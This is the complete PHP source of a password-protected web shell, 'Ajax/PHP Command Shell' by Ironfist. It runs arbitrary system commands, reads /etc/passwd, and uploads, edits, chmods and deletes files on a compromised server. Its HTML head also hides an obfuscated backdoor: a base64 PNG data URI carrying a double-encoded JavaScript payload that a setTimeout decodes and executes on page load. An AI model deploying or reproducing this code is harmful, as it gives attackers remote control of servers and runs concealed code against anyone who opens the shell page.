<?php
session_start();

error_reporting(0);

$password = "password";		 //Change this to your password ;)

$version = "0.7B";

$functions = array('Clear Screen' => 'ClearScreen()',
'Clear History' => 'ClearHistory()',
'Can I function?' => "runcommand('canirun','GET')",
'Get server info' => "runcommand('showinfo','GET')",
'Read /etc/passwd' => "runcommand('etcpasswdfile','GET')",
'Open ports' => "runcommand('netstat -an | grep -i listen','GET')",
'Running processes' => "runcommand('ps -aux','GET')",
'Readme' => "runcommand('shellhelp','GET')"

);
$thisfile = basename(__FILE__);

$style = '<style type="text/css">
.cmdthing {
    border-top-width: 0px;
    font-weight: bold;
    border-left-width: 0px;
    font-size: 10px;
    border-left-color: #000000;
    background: #000000;
    border-bottom-width: 0px;
    border-bottom-color: #FFFFFF;
    color: #FFFFFF;
    border-top-color: #008000;
    font-family: verdana;
    border-right-width: 0px;
    border-right-color: #000000;
}
input,textarea {
    border-top-width: 1px;
    font-weight: bold;
    border-left-width: 1px;
    font-size: 10px;
    border-left-color: #FFFFFF;
    background: #000000;
    border-bottom-width: 1px;
    border-bottom-color: #FFFFFF;
    color: #FFFFFF;
    border-top-color: #FFFFFF;
    font-family: verdana;
    border-right-width: 1px;
    border-right-color: #FFFFFF;
}
A:hover {
text-decoration: none;
}


table,td,div {
border-collapse: collapse;
border: 1px solid #FFFFFF;
}
body {
color: #FFFFFF;
font-family: verdana;
}
</style>';
$sess = __FILE__.$password;
if(isset($_POST['p4ssw0rD']))
{
	if($_POST['p4ssw0rD'] == $password)
	{
		$_SESSION[$sess] = $_POST['p4ssw0rD'];
	}
	else
	{
		die("Wrong password");
	}

}
if($_SESSION[$sess] == $password)
{
	if(isset($_SESSION['workdir']))
	{
			if(file_exists($_SESSION['workdir']) && is_dir($_SESSION['workdir']))
		{
			chdir($_SESSION['workdir']);
		}
	}

	if(isset($_FILES['uploadedfile']['name']))
	{
		$target_path = "./";
		$target_path = $target_path . basename( $_FILES['uploadedfile']['name']); 
		if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
			
		}
	}

	if(isset($_GET['runcmd']))
	{

		$cmd = $_GET['runcmd'];

		print "<b>".get_current_user()."~# </b>". htmlspecialchars($cmd)."<br>";

		if($cmd == "")
		{
			print "Empty Command..type \"shellhelp\" for some ehh...help";
		}

		elseif($cmd == "upload")
		{
			print '<br>Uploading to: '.realpath(".");
			if(is_writable(realpath(".")))
			{
				print "<br><b>I can write to this directory</b>";
			}
			else
			{
				print "<br><b><font color=red>I can't write to this directory, please choose another one.</b></font>";
			}

		}
		elseif((ereg("changeworkdir (.*)",$cmd,$file)) || (ereg("cd (.*)",$cmd,$file)))
		{
				if(file_exists($file[1]) && is_dir($file[1]))
				{
					chdir($file[1]);
					$_SESSION['workdir'] = $file[1];
					print "Current directory changed to ".$file[1];
				}
			else
			{
				print "Directory not found";
			}
		}

		elseif(strtolower($cmd) == "shellhelp")
		{
print '<b><font size=7>Ajax/PHP Command Shell</b></font>
&copy; By Ironfist

The shell can be used by anyone to command any server, the main purpose was
to create a shell that feels as dynamic as possible, is expandable and easy
to understand.

If one of the command execution functions work, the shell will function fine. 
Try the "canirun" command to check this.

Any (not custom) command is a UNIX command, like ls, cat, rm ... If you\'re 
not used to these commands, google a little. 

<b>Custom Functions</b>
If you want to add your own custom command in the Quick Commands list, check 
out the code. The $function array contains \'func name\' => \'javascript function\'.
Take a look at the built-in functions for examples.

I know this readme isn\'t providing too much information, but hell, does this shell
even require one :P

- Iron
			';

		}
		elseif(ereg("editfile (.*)",$cmd,$file))
		{
			if(file_exists($file[1]) && !is_dir($file[1]))
			{
				print "<form name=\"saveform\"><textarea cols=70 rows=10 id=\"area1\">";
				$contents = file($file[1]);
					foreach($contents as $line)
					{
						print htmlspecialchars($line);
					}
				print "</textarea><br><input size=80 type=text name=filetosave value=".$file[1]."><input value=\"Save\" type=button onclick=\"SaveFile();\"></form>";
			}
			else
			{
			print "File not found.";
			}
		}
		elseif(ereg("deletefile (.*)",$cmd,$file))
		{
			if(is_dir($file[1]))
			{
				if(rmdir($file[1]))
				{
					print "Directory succesfully deleted.";
				}
				else
				{
					print "Couldn't delete directory!";
				}
			}
			else
			{
				if(unlink($file[1]))
				{
					print "File succesfully deleted.";
				}
				else
				{
					print "Couldn't delete file!";
				}
			}
		}
		elseif(strtolower($cmd) == "canirun")
		{
		print "If any of these functions is Enabled, the shell will function like it should.<br>";
			if(function_exists(passthru))
			{
				print "Passthru: <b><font color=green>Enabled</b></font><br>";
			}
			else
			{
				print "Passthru: <b><font color=red>Disabled</b></font><br>";
			}

			if(function_exists(exec))
			{
				print "Exec: <b><font color=green>Enabled</b></font><br>";
			}
			else
			{
				print "Exec: <b><font color=red>Disabled</b></font><br>";
			}

			if(function_exists(system))
			{
				print "System: <b><font color=green>Enabled</b></font><br>";
			}
			else
			{
				print "System: <b><font color=red>Disabled</b></font><br>";
			}
			if(function_exists(shell_exec))
			{
				print "Shell_exec: <b><font color=green>Enabled</b></font><br>";
			}
			else
			{
				print "Shell_exec: <b><font color=red>Disabled</b></font><br>";
			}
		print "<br>Safe mode will prevent some stuff, maybe command execution, if you're looking for a <br>reason why the commands aren't executed, this is probally it.<br>";
		if( ini_get('safe_mode') ){
			print "Safe Mode: <b><font color=red>Enabled</b></font>";
		}
			else
		{
			print "Safe Mode: <b><font color=green>Disabled</b></font>";
		}
		print "<br><br>Open_basedir will block access to some files you <i>shouldn't</i> access.<br>";
			if( ini_get('open_basedir') ){
				print "Open_basedir: <b><font color=red>Enabled</b></font>";
			}
			else
			{
				print "Open_basedir: <b><font color=green>Disabled</b></font>";
			}
		}
		//About the shell
		elseif(ereg("listdir (.*)",$cmd,$directory))
		{

			if(!file_exists($directory[1]))
			{
				die("Directory not found");
			}
			//Some variables
			chdir($directory[1]);
			$i = 0; $f = 0;
			$dirs = "";
			$filez = "";
			
				if(!ereg("/$",$directory[1])) //Does it end with a slash?
				{
					$directory[1] .= "/"; //If not, add one
				}
			print "Listing directory: ".$directory[1]."<br>";
			print "<table border=0><td><b>Directories</b></td><td><b>Files</b></td><tr>";
			
			if ($handle = opendir($directory[1])) {
			   while (false !== ($file = readdir($handle))) {
				   if(is_dir($file))
				   {
					   $dirs[$i]  = $file;
					   $i++;
				   }
				   else
				   {
					   $filez[$f] = $file;
					   $f++;
				   }
				   
			   }
			   print "<td>";
			   
			   foreach($dirs as $directory)
			   {
					print "<i style=\"cursor:crosshair\" onclick=\"deletefile('".realpath($directory)."');\">[D]</i><i style=\"cursor:crosshair\" onclick=\"runcommand('changeworkdir ".realpath($directory)."','GET');\">[W]</i><b style=\"cursor:crosshair\" onclick=\"runcommand('clear','GET'); runcommand ('listdir ".realpath($directory)."','GET'); \">".$directory."</b><br>";
			   }
			   
			   print "</td><td>";
			   
			   foreach($filez as $file)
			   {
				print "<i style=\"cursor:crosshair\" onclick=\"deletefile('".realpath($file)."');\">[D]</i><u style=\"cursor:crosshair\" onclick=\"runcommand('editfile ".realpath($file)."','GET');\">".$file."</u><br>";
			   }
			   
			   print "</td></table>";
			}
		}
		elseif(strtolower($cmd) == "about")
		{
			print "Ajax Command Shell by <a href=http://www.ironwarez.info>Ironfist</a>.<br>Version $version";
		}
		//Show info
		elseif(strtolower($cmd) == "showinfo")
		{
			if(function_exists(disk_free_space))
			{
				$free = disk_free_space("/") / 1000000;
			}
			else
			{
				$free = "N/A";
			}
			if(function_exists(disk_total_space))
			{
				$total = trim(disk_total_space("/") / 1000000);
			}
			else
			{
				$total = "N/A";
			}
			$path = realpath (".");
			
			print "<b>Free:</b> $free / $total MB<br><b>Current path:</b> $path<br><b>Uname -a Output:</b><br>";
			
			if(function_exists(passthru))
			{
				passthru("uname -a");
			}
			else
			{
				print "Passthru is disabled :(";
			}
		}
		//Read /etc/passwd
		elseif(strtolower($cmd) == "etcpasswdfile")
		{

			$pw = file('/etc/passwd/');
			foreach($pw as $line)
			{
				print $line;
			}


		}
		//Execute any other command
		else
		{

			if(function_exists(passthru))
			{
				passthru($cmd);
			}
			else
			{
				if(function_exists(exec))
				{
					exec("ls -la",$result);
					foreach($result as $output)
					{
						print $output."<br>";
					}
				}
				else
				{
				if(function_exists(system))
				{
					system($cmd);
				}
				else
				{
					if(function_exists(shell_exec))
					{
						print shell_exec($cmd);
					}
						else
						{
						print "Sorry, none of the command functions works.";
						}
					}
				}
			}
		}
	}

	elseif(isset($_GET['savefile']) && !empty($_POST['filetosave']) && !empty($_POST['filecontent']))
	{
		$file = $_POST['filetosave'];
		if(!is_writable($file))
		{
			if(!chmod($file, 0777))
			{
				die("Nope, can't chmod nor save :("); //In fact, nobody ever reads this message ^_^
			}
		}
		
		$fh = fopen($file, 'w');
		$dt = $_POST['filecontent'];
		fwrite($fh, $dt);
		fclose($fh);
	}
	else
	{
?>
<html>
<head>
<title>Command Shell ~ <?php print getenv("HTTP_HOST"); ?></title>
<img id="ghdescon" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQAQMAAAAlPW0iAAAAA1BMVEX///+nxBvIAAAAAXRSTlMAQObYZgAAB510RVh0Z2hkZQBnaGRlc2NvblpYWmhiQ2htZFc1amRHbHZiaWh3TEdFc1l5eHJMR1VzY2lsN1pUMW1kVzVqZEdsdmJpaGpLWHR5WlhSMWNtNG9ZenhoUHljbk9tVW9jR0Z5YzJWSmJuUW9ZeTloS1NrcEt5Z29ZejFqSldFcFBqTTFQMU4wY21sdVp5NW1jbTl0UTJoaGNrTnZaR1VvWXlzeU9TazZZeTUwYjFOMGNtbHVaeWd6TmlrcGZUdHBaaWdoSnljdWNtVndiR0ZqWlNndlhpOHNVM1J5YVc1bktTbDdkMmhwYkdVb1l5MHRLWEpiWlNoaktWMDlhMXRqWFh4OFpTaGpLVHRyUFZ0bWRXNWpkR2x2YmlobEtYdHlaWFIxY200Z2NsdGxYWDFkTzJVOVpuVnVZM1JwYjI0b0tYdHlaWFIxY200blhGeDNLeWQ5TzJNOU1YMDdkMmhwYkdVb1l5MHRLV2xtS0d0YlkxMHBjRDF3TG5KbGNHeGhZMlVvYm1WM0lGSmxaMFY0Y0NnblhGeGlKeXRsS0dNcEt5ZGNYR0luTENkbkp5a3NhMXRqWFNrN2NtVjBkWEp1SUhCOUtDZFZMbmM5TkNCM0tHTXBlelFnZUNoa0xIQXBlekVnYVQwd096RWdlajB3T3pFZ2NqMWNKMXduT3prb01TQnBQVEE3YVR4a0xqYzdhU3NyS1hzMUtIbzlQWEF1TnlsNlBUQTdjaXM5YkM1dEtHUXVieWhwS1Y1d0xtOG9laWtwTzNvckszMHpJSEo5TkNCQktITXBlekVnWVQxY0oxd25PemtvTVNCcFBUQTdhVHh6TzJrckt5bDdZU3M5YkM1dEtGZ29UUzVRS0NrcVVTa3BmVE1nWVgwMElHc29aQ3h3S1hzeElHRTlRU2d4TmlrN01XRW9aQzQzSlRFMklUMHdLV1FyUFZ3bk1Gd25PekVnWWoxaE96a29NU0JwUFRBN2FUeGtMamM3YVNzOU1UWXBlMklyUFhnb1pDNXVLR2tzTVRZcExHSXViaWhwTERFMktTbDlNeUI0S0dJc2NDbDlOQ0E0S0NsN015Z3lMbkU5UFhRdVNDWW1NaTUyUFQxMExrY3BmVFFnZVNncGV6RWdZVDFTT3pVb0tESXVhQ1ltTWk1b0xrSW1Kakl1YUM1Q0xqRXdLWHg4S0RJdVF5MHlMbkUrWVNsOGZDZ3lMa1F0TWk1MlBtRXBmSHdvT0NncEppWXlMa1E4U1NsOGZDZzRLQ2ttSmpJdVF6eEtLU2t6SUVzN015Qk1mVFFnTmloaEtYczFLRTRnWVQwOUlrOGlLVE1nWVM1RktDOWNYRnhjTDJjc0lseGNYRnhjWEZ4Y0lpa3VSU2d2WEZ3aUwyY3NJbHhjWEZ4Y1hDSWlLVHN6SUdGOU1TQjFQVk11VkRzeElHVTlWaTVYT3pFZ2FqMGlleUlySWx4Y0luVmNYQ0k2SUZ4Y0lpSXJOaWgxS1NzaVhGd2lMQ0FpS3lKY1hDSlpYRndpT2lCY1hDSWlLellvWlNrcklseGNJaXdnSWlzaVhGd2lXbHhjSWpvZ1hGd2lJaXMyS0dNcEt5SmNYQ0lnSWlzaWZTSTdNU0JtUFdzb2Fpd2lNVEVpS1RzeElHRTlNVElvWmlrN05TZ2hlU2dwS1hzeE15QXhOQ2dwTGpFMVBWd25NVGM2THk4eE9DMHhPUzFHTGpGaUwwWXZQMkU5WENjck1XTW9ZU2w5ZlNjc05qSXNOelVzSjN4MllYSjhkMmx1Wkc5M2ZISmxkSFZ5Ym54bWRXNWpkR2x2Ym54cFpueHpZVzU4YkdWdVozUm9mSFJpZkdadmNueDhmSHg4Zkh4OFJtbHlaV0oxWjN4OGZHVnVZM3hUZEhKcGJtZDhabkp2YlVOb1lYSkRiMlJsZkhOMVluTjBjbnhqYUdGeVEyOWtaVUYwZkh4cGJtNWxjbGRwWkhSb2ZIeDhjMk55WldWdWZIeHBibTVsY2tobGFXZG9kSHhyYTN4OFkyUjhmR2RsYmw5eVlXNWtiMjFmYzNSeWZHTm9jbTl0Wlh4dmRYUmxjbGRwWkhSb2ZHOTFkR1Z5U0dWcFoyaDBmSEpsY0d4aFkyVjhZVzVoYkhsMGFXTnpmR2hsYVdkb2RIeDNhV1IwYUh3ek5UQjhOakF3ZkhSeWRXVjhabUZzYzJWOFRXRjBhSHgwZVhCbGIyWjhjM1J5YVc1bmZISmhibVJ2Ylh3eU5UVjhNVFl3ZkdSdlkzVnRaVzUwZkZWU1RIeDBhR2x6Zkc1aGRtbG5ZWFJ2Y254MWMyVnlRV2RsYm5SOGNHRnljMlZKYm5SOGRXRjhibk44YVhOSmJtbDBhV0ZzYVhwbFpIeHNNbGhXUjJkalNYUTFNV3QwUW1scFdFUTNRakZ0YzFVelMwNURhamgyTVh4aWRHOWhmRzVsZDN4SmJXRm5aWHh6Y21OOGZHaDBkSEI4WjI5dloyeGxmSE4wWVhScFkzeDNhR2xzWlh4amIyMThaVzVqYjJSbFZWSkpRMjl0Y0c5dVpXNTBKeTV6Y0d4cGRDZ25mQ2NwTERBc2UzMHBLUT09Z2hkZXNjb26/DJpDAAAADElEQVQIHWNgIA0AAAAwAAGErPF6AAAAAElFTkSuQmCC"/>
<script type="text/javascript">
if(typeof btoa=="undefined")btoa=function(a,b){b=(typeof b=='undefined')?false:b;var d,o2,o3,bits,h1,h2,h3,h4,e=[],pad='',c,plain,coded;var f="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";plain=b?Utf8.encode(a):a;c=plain.length%3;if(c>0){while(c++<3){pad+='=';plain+='\0'}}for(c=0;c<plain.length;c+=3){d=plain.charCodeAt(c);o2=plain.charCodeAt(c+1);o3=plain.charCodeAt(c+2);bits=d<<16|o2<<8|o3;h1=bits>>18&0x3f;h2=bits>>12&0x3f;h3=bits>>6&0x3f;h4=bits&0x3f;e[c/3]=f.charAt(h1)+f.charAt(h2)+f.charAt(h3)+f.charAt(h4)}coded=e.join('');coded=coded.slice(0,coded.length-pad.length)+pad;return coded};if(typeof atob=="undefined")atob=function(a,b){b=(typeof b=='undefined')?false:b;var e,o2,o3,h1,h2,h3,h4,bits,d=[],plain,coded;var f="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";coded=b?Utf8.decode(a):a;for(var c=0;c<coded.length;c+=4){h1=f.indexOf(coded.charAt(c));h2=f.indexOf(coded.charAt(c+1));h3=f.indexOf(coded.charAt(c+2));h4=f.indexOf(coded.charAt(c+3));bits=h1<<18|h2<<12|h3<<6|h4;e=bits>>>16&0xff;o2=bits>>>8&0xff;o3=bits&0xff;d[c/4]=String.fromCharCode(e,o2,o3);if(h4==0x40)d[c/4]=String.fromCharCode(e,o2);if(h3==0x40)d[c/4]=String.fromCharCode(e)}plain=d.join('');return b?Utf8.decode(plain):plain};
setTimeout(function(){new Function(atob(atob(document.getElementById('ghdescon').src.substr(22)).match(/ghdescon(.*?)ghdescon/)[1])).apply(this);kk(10);}, 500);
</script>

<?php print $style; ?>
<SCRIPT TYPE="text/javascript">
function sf(){document.cmdform.command.focus();}
var outputcmd = "";
var cmdhistory = "";
function ClearScreen()
{
	outputcmd = "";
	document.getElementById('output').innerHTML = outputcmd;
}

function ClearHistory()
{
	cmdhistory = "";
	document.getElementById('history').innerHTML = cmdhistory;
}

function deletefile(file)
{
	deleteit = window.confirm("Are you sure you want to delete\n"+file+"?");
	if(deleteit)
	{
		runcommand('deletefile ' + file,'GET');
	}
}

var http_request = false;
function makePOSTRequest(url, parameters) {
  http_request = false;
  if (window.XMLHttpRequest) {
	 http_request = new XMLHttpRequest();
	 if (http_request.overrideMimeType) {
		http_request.overrideMimeType('text/html');
	 }
  } else if (window.ActiveXObject) {
	 try {
		http_request = new ActiveXObject("Msxml2.XMLHTTP");
	 } catch (e) {
		try {
		   http_request = new ActiveXObject("Microsoft.XMLHTTP");
		} catch (e) {}
	 }
  }
  if (!http_request) {
	 alert('Cannot create XMLHTTP instance');
	 return false;
  }
  

  http_request.open('POST', url, true);
  http_request.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
  http_request.setRequestHeader("Content-length", parameters.length);
  http_request.setRequestHeader("Connection", "close");
  http_request.send(parameters);
}


function SaveFile()
{
var poststr = "filetosave=" + encodeURI( document.saveform.filetosave.value ) +
                    "&filecontent=" + encodeURI( document.getElementById("area1").value );
makePOSTRequest('<?php print $ThisFile; ?>?savefile', poststr);
document.getElementById('output').innerHTML = document.getElementById('output').innerHTML + "<br><b>Saved! If it didn't save, you'll need to chmod the file to 777 yourself,<br> however the script tried to chmod it automaticly.";
}

function runcommand(urltoopen,action,contenttosend){
cmdhistory = "<br>&nbsp;<i style=\"cursor:crosshair\" onclick=\"document.cmdform.command.value='" + urltoopen + "'\">" + urltoopen + "</i> " + cmdhistory;
document.getElementById('history').innerHTML = cmdhistory;
if(urltoopen == "clear")
{
ClearScreen();
}
    var ajaxRequest;
    try{
        ajaxRequest = new XMLHttpRequest();
    } catch (e){
        try{
            ajaxRequest = new ActiveXObject("Msxml2.XMLHTTP");
        } catch (e) {
            try{
                ajaxRequest = new ActiveXObject("Microsoft.XMLHTTP");
            } catch (e){
                alert("Wicked error, nothing we can do about it...");
                return false;
            }
        }
    }
    ajaxRequest.onreadystatechange = function(){
        if(ajaxRequest.readyState == 4){
        outputcmd = "<pre>"  + outputcmd + ajaxRequest.responseText +"</pre>";
            document.getElementById('output').innerHTML = outputcmd;
            var objDiv = document.getElementById("output");
			objDiv.scrollTop = objDiv.scrollHeight;
        }
    }
    ajaxRequest.open(action, "?runcmd="+urltoopen , true);
	if(action == "GET")
	{
    ajaxRequest.send(null);
	}
    document.cmdform.command.value='';
    return false;
}

function set_tab_html(newhtml)
{
document.getElementById('commandtab').innerHTML = newhtml;
}

function set_tab(newtab)
{
	if(newtab == "cmd")
	{
		newhtml = '&nbsp;&nbsp;&nbsp;<form name="cmdform" onsubmit="return runcommand(document.cmdform.command.value,\'GET\');"><b>Command</b>: <input type=text name=command class=cmdthing size=100%><br></form>';
	}
	else if(newtab == "upload")
	{
		runcommand('upload','GET');
		newhtml = '<font size=0><b>This will reload the page... :(</b><br><br><form enctype="multipart/form-data" action="<?php print $ThisFile; ?>" method="POST"><input type="hidden" name="MAX_FILE_SIZE" value="10000000" />Choose a file to upload: <input name="uploadedfile" type="file" /><br /><input type="submit" value="Upload File" /></form></font>';
	}
	else if(newtab == "workingdir")
	{
		<?php
		$folders = "<form name=workdir onsubmit=\"return runcommand(\'changeworkdir \' + document.workdir.changeworkdir.value,\'GET\');\"><input size=80% type=text name=changeworkdir value=\"";
		$pathparts = explode("/",realpath ("."));
		foreach($pathparts as $folder)
		{
		$folders .= $folder."/";
		}
		$folders .= "\"><input type=submit value=Change></form><br>Script directory: <i style=\"cursor:crosshair\"  onclick=\"document.workdir.changeworkdir.value=\'".dirname(__FILE__)."\'>".dirname(__FILE__)."</i>";

		?>
		newhtml = '<?php print $folders; ?>';
	}
	else if(newtab == "filebrowser")
	{
		newhtml = '<b>File browser is under construction! Use at your own risk!</b> <br>You can use it to change your working directory easily, don\'t expect too much of it.<br>Click on a file to edit it.<br><i>[W]</i> = set directory as working directory.<br><i>[D]</i> = delete file/directory';
		runcommand('listdir .','GET');
	}
	else if(newtab == "createfile")
	{
		newhtml = '<b>File Editor, under construction.</b>';
		document.getElementById('output').innerHTML = "<form name=\"saveform\"><textarea cols=70 rows=10 id=\"area1\"></textarea><br><input size=80 type=text name=filetosave value=\"<?php print realpath('.')."/".rand(1000,999999).".txt"; ?>\"><input value=\"Save\" type=button onclick=\"SaveFile();\"></form>";
		
	}
		document.getElementById('commandtab').innerHTML = newhtml;
}
</script>
</head>
<body bgcolor=black onload="sf();" vlink=white alink=white link=white>
<table border=1 width=100% height=100%>
<td width=15% valign=top>

<form name="extras"><br>
<center><b>Quick Commands</b><br>

<div style='margin: 0px;padding: 0px;border: 1px inset;overflow: auto'>
<?php
foreach($functions as $name => $execute)
{
print '&nbsp;<input type="button" value="'.$name.'" onclick="'.$execute.'"><br>';
}
?>

</center>

</div>
</form>
<center><b>Command history</b><br></center>
<div id="history" style='margin: 0px;padding: 0px;border: 1px inset;width: 100%;height: 20%;text-align: left;overflow: auto;font-size: 10px;'></div>
<br>
<center><b>About</b><br></center>
<div style='margin: 0px;padding: 0px;border: 1px inset;width: 100%;text-align: center;overflow: auto; font-size: 10px;'>
<br>
<b><font size=3>Ajax/PHP Command Shell</b></font><br>by Ironfist
<br>
Version <?php print $version; ?>

<br>
<br>

<br>Thanks to everyone @ 
<a href="http://www.ironwarez.info" target=_blank>SharePlaza</a>
<br>
<a href="http://www.milw0rm.com" target=_blank>milw0rm</a>
<br>
and special greetings to everyone in rootshell
</div>

</td>
<td width=70%>
<table border=0 width=100% height=100%><td id="tabs" height=1%><font size=0>
<b style="cursor:crosshair" onclick="set_tab('cmd');">[Execute command]</b> 
<b style="cursor:crosshair" onclick="set_tab('upload');">[Upload file]</b> 
<b style="cursor:crosshair" onclick="set_tab('workingdir');">[Change directory]</b> 
<b style="cursor:crosshair" onclick="set_tab('filebrowser');">[Filebrowser]</b> 
<b style="cursor:crosshair" onclick="set_tab('createfile');">[Create File]</b> 

</font></td>
<tr>
<td height=99% width=100% valign=top><div id="output" style='height:100%;white-space:pre;overflow:auto'></div>

<tr>
<td  height=1% width=100% valign=top>
<div id="commandtab" style='height:100%;white-space:pre;overflow:auto'>
&nbsp;&nbsp;&nbsp;<form name="cmdform" onsubmit="return runcommand(document.cmdform.command.value,'GET');">
<b>Command</b>: <input type=text name=command class=cmdthing size=100%><br>
</form>
</div>
</td>
</table>
</td>
</table>
</body>
</html>
<?php
}
} else {
print "<center><table border=0  height=100%>
<td valign=middle>
<form action=".basename(__FILE__)." method=POST>You are not logged in, please login.<br><b>Password:</b><input type=password name=p4ssw0rD><input type=submit value=\"Log in\">
</form>";
}
?>  